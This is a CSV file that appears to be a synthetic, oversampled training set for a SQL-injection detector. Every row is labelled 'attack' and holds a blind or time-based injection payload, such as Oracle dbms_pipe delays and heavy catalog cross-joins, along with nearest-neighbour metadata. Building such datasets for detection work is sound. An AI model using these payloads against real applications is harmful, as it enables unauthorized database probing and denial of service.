id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000059,attack,boolean,"1%'   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000021,1.9524201329926079
SMOTE_000060,attack,boolean,"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,0.4401216932982554
SMOTE_000061,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000108,0.2561570096291569
SMOTE_000062,attack,boolean,"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000043,0.06969169218260086
SMOTE_000063,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000226,0.016916339371866516
SMOTE_000064,attack,boolean,"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000066,0.02354193235842366
SMOTE_000065,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000196,0.27220886402322525
SMOTE_000066,attack,boolean,"1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000173,0.2516865000053898
SMOTE_000067,attack,boolean,1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000202,1.01893613844943
SMOTE_000068,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000162,1.009125502581105
SMOTE_000069,attack,boolean,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000179,0.5816666587013739
SMOTE_000070,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000017,0.8677144024860171
SMOTE_000071,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",nearest_attack_euclidean,R000076,1.286384383791162
SMOTE_000072,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000172,0.8159921745095404
SMOTE_000073,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",nearest_attack_euclidean,R000208,2.0834964829902054
SMOTE_000074,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000026,1.0365120993194143
SMOTE_000075,attack,boolean,"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000063,0.5908109674810249
SMOTE_000076,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",nearest_attack_euclidean,R000208,1.634209896049322
SMOTE_000077,attack,boolean,"1""  )   where 7957  =  7957 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000224,0.0203676316258301
SMOTE_000078,attack,boolean,"1 where 2674  =  2674 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000071,0.13145349973198703
SMOTE_000079,attack,boolean,"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000167,0.4604097582897961
SMOTE_000080,attack,boolean,"1   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000223,0.8572315227234315
SMOTE_000081,attack,boolean,"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000231,0.35617783752220555
SMOTE_000082,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000113,0.0693034994444762
SMOTE_000083,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000196,0.27409616178671553
SMOTE_000084,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",nearest_attack_euclidean,R000247,0.5210470574707955
SMOTE_000085,attack,boolean,"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000153,1.1217106806031991
SMOTE_000086,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000048,1.050384526455305
SMOTE_000087,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",nearest_attack_euclidean,R000150,1.2402458943349892
SMOTE_000088,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""%""  =  """,nearest_attack_euclidean,R000038,1.585411475075595
SMOTE_000089,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000280,0.9123919693468524
SMOTE_000090,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000017,0.0
SMOTE_000091,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000298,0.8088532462091901
SMOTE_000092,attack,boolean,"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000186,0.5263952504967675
SMOTE_000093,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",nearest_attack_euclidean,R000139,1.1904715154723642
SMOTE_000094,attack,boolean,"1'+  (  select 'zxxh' where 4065  =  4065 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000238,0.7501253055508906
SMOTE_000095,attack,boolean,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",nearest_attack_euclidean,R000148,0.47257461586427957
SMOTE_000096,attack,boolean,"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000123,0.14349723381446258
SMOTE_000097,attack,boolean,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000099,0.7438546152575798
SMOTE_000098,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000005,1.8585837979503788
SMOTE_000099,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000156,1.1740714376013592
SMOTE_000100,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000068,0.6011106202341564
SMOTE_000101,attack,boolean,"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000303,0.9632884194894066
SMOTE_000102,attack,boolean,"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,nearest_attack_euclidean,R000168,0.5403678114216767
SMOTE_000103,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000026,1.0613301532507557
SMOTE_000104,attack,boolean,"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000197,0.24908863346466134
SMOTE_000105,attack,boolean,-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,nearest_attack_euclidean,R000072,1.2171954925714683
SMOTE_000106,attack,boolean,"1   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000199,1.2286478265674012
SMOTE_000107,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",nearest_attack_euclidean,R000076,0.8489911272772634
SMOTE_000108,attack,boolean,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000003,0.6425558240467082
SMOTE_000109,attack,boolean,"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000117,1.063554192485254
SMOTE_000110,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000091,0.3146278679527577
SMOTE_000111,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",nearest_attack_euclidean,R000285,0.039101801071274714
SMOTE_000112,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000230,0.46307957724177357
SMOTE_000113,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000240,1.4385782989937759
SMOTE_000114,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",nearest_attack_euclidean,R000254,0.23901033518050388
SMOTE_000115,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000078,0.712558157883289
SMOTE_000116,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000004,1.9892379660088801
SMOTE_000117,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000280,0.05257371783452553
SMOTE_000118,attack,boolean,"1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000289,0.6386715956715789
SMOTE_000119,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",nearest_attack_euclidean,R000219,1.0562879696518255
SMOTE_000120,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000270,0.206189415285037
SMOTE_000121,attack,boolean,"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000177,1.01503398490377
SMOTE_000122,attack,boolean,1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,nearest_attack_euclidean,R000141,0.04645786141461606
SMOTE_000123,attack,boolean,"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000256,1.1512080312463253
SMOTE_000124,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",nearest_attack_euclidean,R000083,1.0063247194200606
SMOTE_000125,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000163,0.054525646874066705
SMOTE_000126,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000028,0.5470204049675946
